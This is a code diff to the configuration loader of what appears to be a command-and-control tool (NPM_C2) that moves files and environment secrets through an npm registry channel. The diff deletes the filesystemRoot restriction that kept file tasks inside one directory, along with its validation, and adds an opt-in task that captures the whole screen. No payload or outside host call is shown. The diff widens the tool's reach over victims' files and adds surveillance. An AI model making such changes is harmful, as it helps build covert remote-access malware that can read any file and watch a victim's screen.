@@ -17,9 +17,9 @@ export const DEFAULTS = Object.freeze({
   stateFile: '', // role-specific default is used when empty
   maxFileBytes: 32 * 1024, // cap for the getfile task (channel moves ~130B/tag)
   revealEnv: false, // opt-in: let the env task return real values (may expose secrets)
-  filesystemRoot: '.', // path-oriented tasks cannot escape this directory
   downloadDir: 'downloads',
   enableFunOps: false,
+  enableScreenshot: false, // opt-in: the screenshot task captures the whole screen
   allowPublicRegistry: false,
   allowInsecureHttp: false,
   logLevel: 'info',
@@ -137,10 +137,12 @@ export function loadConfig(explicitPath) {
   if (process.env.NPM_C2_REVEAL_ENV !== undefined && process.env.NPM_C2_REVEAL_ENV !== '') {
     cfg.revealEnv = parseBoolFlag(process.env.NPM_C2_REVEAL_ENV);
   }
-  if (process.env.NPM_C2_FILESYSTEM_ROOT) cfg.filesystemRoot = process.env.NPM_C2_FILESYSTEM_ROOT;
   if (process.env.NPM_C2_DOWNLOAD_DIR) cfg.downloadDir = process.env.NPM_C2_DOWNLOAD_DIR;
   if (process.env.NPM_C2_ENABLE_FUN_OPS !== undefined && process.env.NPM_C2_ENABLE_FUN_OPS !== '') {
     cfg.enableFunOps = parseBoolFlag(process.env.NPM_C2_ENABLE_FUN_OPS);
+  }
+  if (process.env.NPM_C2_ENABLE_SCREENSHOT !== undefined && process.env.NPM_C2_ENABLE_SCREENSHOT !== '') {
+    cfg.enableScreenshot = parseBoolFlag(process.env.NPM_C2_ENABLE_SCREENSHOT);
   }
   if (process.env.NPM_C2_ALLOW_PUBLIC_REGISTRY !== undefined && process.env.NPM_C2_ALLOW_PUBLIC_REGISTRY !== '') {
     cfg.allowPublicRegistry = parseBoolFlag(process.env.NPM_C2_ALLOW_PUBLIC_REGISTRY);
@@ -192,14 +194,9 @@ export function loadConfig(explicitPath) {
   }
   cfg.revealEnv = parseBoolFlag(cfg.revealEnv);
   cfg.enableFunOps = parseBoolFlag(cfg.enableFunOps);
+  cfg.enableScreenshot = parseBoolFlag(cfg.enableScreenshot);
   cfg.allowPublicRegistry = parseBoolFlag(cfg.allowPublicRegistry);
   cfg.allowInsecureHttp = parseBoolFlag(cfg.allowInsecureHttp);
-  cfg.filesystemRoot = path.resolve(String(cfg.filesystemRoot));
-  const rootStat = fs.statSync(cfg.filesystemRoot, { throwIfNoEntry: false });
-  if (!rootStat?.isDirectory()) {
-    throw new Error(`filesystemRoot must be an existing directory: "${cfg.filesystemRoot}"`);
-  }
-  cfg.filesystemRoot = fs.realpathSync(cfg.filesystemRoot);
   cfg.downloadDir = path.resolve(String(cfg.downloadDir));
   if (!LOG_LEVELS.has(cfg.logLevel)) {
     throw new Error(`logLevel must be one of ${[...LOG_LEVELS].join(', ')}`);
